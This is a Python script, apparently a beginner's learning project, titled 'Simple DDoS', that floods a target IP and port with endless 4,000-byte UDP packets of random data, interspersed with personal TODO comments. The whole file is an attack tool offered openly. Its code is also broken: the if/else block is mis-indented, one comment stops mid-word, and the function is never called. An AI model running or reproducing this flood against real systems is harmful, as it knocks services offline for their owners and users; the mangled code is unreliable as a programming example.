import os, sys, socket
import platform
import random
from datetime import datetime as dt

os.system('figlet Simple DDoS | lolcat')

# TODO: Read docs on time, os, random, threading, and platform
# TODO: Take questions to Mastodon
# TODO: Eat good food
# TODO: Get plenty of water and sleep


# ANSI colors with proper escape
R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
W = '\033[0m'


# v1: just create ddos script

# Instead ofusing SOCK_STREAM for TCP connections
# using SOCK_DGRAM for UDP connections to keep packets small
# If iterating on this, will use SOCK_STREAM to send bigger packets if I actually understand
# what that means for the network being hit

# Is there enough precedent with ipv6 addresses to use socket.AF_INET6?
# How would that work?

# TODO: research ipv6


# this is better system = getattr(platform.uname(), "system")
# instead of hardcoding a specific index
# because if something in the l


def ddos(target, port):
    sent = 0
    if len(sys.argv) == 3:
       socket.gethostbyname(sys.argv[1])  # create string from IPv4 to pass as argument to sentto
     else:
     print('\n' + R + '[!]' + R + 'Invalid amount of arguments')
     print('\n' + 'Syntax: python3 ddos.py <ip> <port>')

     print("-" * 25)
     print("Attacking target:" + target)
     print("Time started:" + str(dt.now()))

     try:
         # create an infinite loop to continuously send junk data
         # to target ip
         while True:
             # Create a new socket
             # assign socket to s
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

             # create a variable that will send 4000 random bytes

             bytes1 = random.randbytes(4000)
             #  bytes2 = random.randbytes(4000)
             # system = platform.uname().system

             # send 4000 random bytes to the target on port passed as arg
             s.sendto(bytes1, (target, port))
             sent = sent + 1
             
     # Break out of infinite loop

     except KeyboardInterrupt:
         print('\n' + R + '[!]' + C + 'Keyboard Interrupt. Terminating session...' + W)

     except socket.gaierror:
         print(R + '[-] ' + C + 'Unknown address.')
         print(R + '[-] ' + C + 'Please input the correct ip address.')

     except NameError:
         print(R + '[-] ' + C + 'Unknown address.')
         print(R + '[-] ' + C + 'Please input the correct ip address.')

